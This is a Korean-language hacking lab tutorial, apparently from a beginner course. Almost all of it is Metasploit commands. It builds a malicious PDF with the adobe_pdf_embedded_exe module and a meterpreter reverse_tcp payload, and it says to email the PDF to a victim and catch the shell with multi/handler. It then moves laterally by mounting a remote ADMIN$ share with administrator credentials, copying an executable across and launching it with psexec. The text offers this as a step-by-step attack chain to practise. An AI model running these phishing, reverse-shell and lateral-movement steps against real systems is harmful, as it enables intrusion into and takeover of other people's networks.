첫날에 배우는 실습입니다.  
리버스쉘이므로 외부 ip를 사용한다면 추가작업이 필요합니다.  
이방법은 실제로 통하지는 않습니다.  
그치만 한번 공부 해보자구요!  
(리버스쉘 응용 참고영상입니다 https://youtu.be/P47-lJbpHdc)
msfconsole  
msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe  
msf exploit(adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp  
msf exploit(adobe_pdf_embedded_exe) > set FILENAME meterpreter.pdf  
msf exploit(adobe_pdf_embedded_exe) > set infilename (원본pdf이름)  
msf exploit(adobe_pdf_embedded_exe) > set lhost 192.168.57.10  
msf exploit(adobe_pdf_embedded_exe) > set lport 443  
msf exploit(adobe_pdf_embedded_exe) > exploit  
msf exploit(adobe_pdf_embedded_exe) > use multi/handler  
PDF를 메일로 전송합니다.   
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
msf exploit(handler) > set lhost 192.168.57.10  
msf exploit(handler) > set lport 443  
msf exploit(handler) > exploit  
victim에서 메일 첨부파일을 실행하면 PDF악성파일이 추가로 생성됩니다.  
이후 연결대기... 접속되면 다음과 같이 입력하여 측면공격을 수행해봅니다.  
(내부정찰-거점확보-측면이동-제어지속)  
meterpreter > shell  
C:\> net use Z: \\192.168.56.60\ADMIN$ Password1! /U: LAB\administrator
C:\> Z:
Z:\> copy C:\Users\Users1.LAB\Desktop\tools\tai32.exe .\
새로운 터미널
msfconsole  
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  
msf exploit(multi/handler) > set lhost 192.168.57.10  
msf exploit(multi/handler) > set lport 8080  
msf exploit(multi/handler) > exploit  
다시 이전 터미널로 돌아가서,
Z:\> C:
C:\Users\Users1.LAB\Desktop\tools\> psexec -accepteula -U administrator -p P@ssword1! \\USER2 lab.example.com -s -d cmd.exe /c "c:\Windows\Temp\tai32.exe"

미세먼지팁
윈도우 커맨드는 대소문자를 구분하지 않습니다!
C:는 c:
